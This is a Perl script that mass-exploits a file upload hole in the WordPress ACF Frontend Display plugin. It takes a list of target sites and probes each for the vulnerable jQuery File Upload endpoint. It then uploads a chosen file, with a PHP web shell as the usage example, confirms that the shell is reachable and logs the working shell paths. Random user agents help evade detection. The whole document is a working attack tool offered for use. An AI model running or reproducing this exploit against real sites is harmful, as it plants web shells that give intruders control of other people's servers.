#!/usr/bin/perl
# install parallel::forkmanager module sudo apt-get install libparallel-forkmanager-perl
# or cpan Parallel::ForkManager 
# @version 1.0
# @author M-A
# @Bug Founder TUNISIEN CYBER (Miutex)
# @link https://raw.githubusercontent.com/mranarshit/Wordpress-file-upload/master/acf_up.pl
# Perl Lov3r :)
use LWP::UserAgent;
use Getopt::Long;
use Parallel::ForkManager;
 
 
my $datestring = localtime();
my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();
my $qqvul ="/wp-content/plugins/acf-frontend-display/js/blueimp-jQuery-File-Upload-d45deb1/server/php/";#theme path vul
 
our($list,$wordlist,$file,$thread); 
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
 
GetOptions(
    'url|u=s' => \$list,
    'file|f=s' => \$file,
    'wordlist|w=s' => \$log,
    'threads|t=i'	=> \$thread,
) || &flag();
 
if(!defined($list) || !defined($file)|| !defined($log) || !defined($thread) ){
	&flag();
        exit;
}
 
print "[+] Started : $datestring\n";
 
open(my $arq,'<'.$list) || die($!);
my @site = <$arq>;
@site = grep { !/^$/ } @site;
close($arq);
print "[".($#site+1)."] URL to test upload\n\n"; 
 
my $pm = new Parallel::ForkManager($thread);# preparing fork
foreach my $web (@site){#loop => working
    my $pid = $pm->start and next;
    chomp($web);
    if($web !~ /^(http|https):\/\//){
        $web = 'http://'.$web;
    }
    
    expqq($web);
    $pm->finish;
}
$pm->wait_all_children();
 
sub expqq{
    my $useragent = randomagent();#Get a Random User Agent
    my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });#Https websites accept
    $ua->timeout(10);
    $ua->agent($useragent);
    print "[Testing] $_[0]\n";
    my $url = $_[0].$qqvul;
    my $response = $ua->get($url);
    if ($response->is_success || $response->content=~/error/|| $response->content=~/files/|| $response->content=~/name/){
        #print "[OK] Exploit Exists\n";
        #print "[*] Sent payload\n";
        my $regex = 'name":"'.$file.'",';
        my $body = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ 'files' => ["$file"] ]
        );
        if ($body->is_success ||$body->content=~ /$regex/ ||$body->content=~/delete_url/){
            #print "[+] Payload successfully executed\n";
            #print "[*] Checking if shell was uploaded\n\n";
            my $shell = $_[0]."/wp-content/uploads/uigen_".$year."/".$file;
            my $x = $ua->get($shell);
            if ($x->is_success) {
                print "[Path] $shell\n\n";
                save ($log,$shell);
            }
            
        } 
        else {
            print "[-] Payload failed : Not vulnerable\n\n";
        }
    }
    else {
        print "[No] Exploit Not Found\n\n";
    }
}
 
 
sub flag {
    print "\n[*] WP Acf-Frontend-Display Plugin File Upload Exploiter \n";
    print "[*] Coder : M-A\n";
    print "[+] Bug Founder : TUNISIEN CYBER (Miutex)\n";
    print "[+] Usage :\n";
    print "[REQUIRED] -u | urllist  (List with ftp hosts).\n";
    print "[REQUIRED] -f | file  (File to upload).\n";
    print "[REQUIRED] -w | logfile (File to save results).\n";
    print "[REQUIRED] -t | forknumber (Namber of fork).\n";
    print "\nExample: Wup.php -u urllist.txt -f shell.php -w log.txt -t 15 \n\n";
    
}
 
sub save {
    my ($file,$item) = @_;
    open(SAVE,">>".$file);
    print SAVE $item."\n";
    close(SAVE);
}
